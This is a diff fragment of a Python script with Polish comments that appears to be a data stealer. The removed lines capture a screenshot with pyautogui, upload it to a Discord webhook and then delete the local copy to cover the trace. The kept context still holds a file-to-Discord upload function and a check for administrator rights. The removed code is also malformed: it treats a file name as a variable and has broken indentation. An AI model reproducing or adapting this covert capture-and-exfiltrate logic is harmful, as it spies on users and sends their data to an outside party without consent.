@@ -16,21 +16,7 @@ if not os.access(users_directory, os.W_OK):
     print("Brak wymaganych uprawnień. Uruchom skrypt jako administrator.")
     sys.exit(1)
 
-# Robienie zrzutu ekranu
-screenshot = pyautogui.screenshot()
 
-# Zapisanie zrzutu ekranu do pliku
-screenshot.save("screenshot.png")
-
-# wysyłanie 
-       if len(screenshot.png) > 0:
-            send_file_to_discord(screenshot.png, webhook_url_1)
-            
-            # Usuwanie pliku ZIP po wysłaniu
-            os.remove(screenshot.png)
-            print(f"Plik {screenshot.png} został usunięty po wysłaniu.")
-        else:
-            print("Brak plików do spakowania i wysłania.")
 # Funkcja do wysyłania pliku na Discord
 def send_file_to_discord(file_path, webhook_url):
     try:
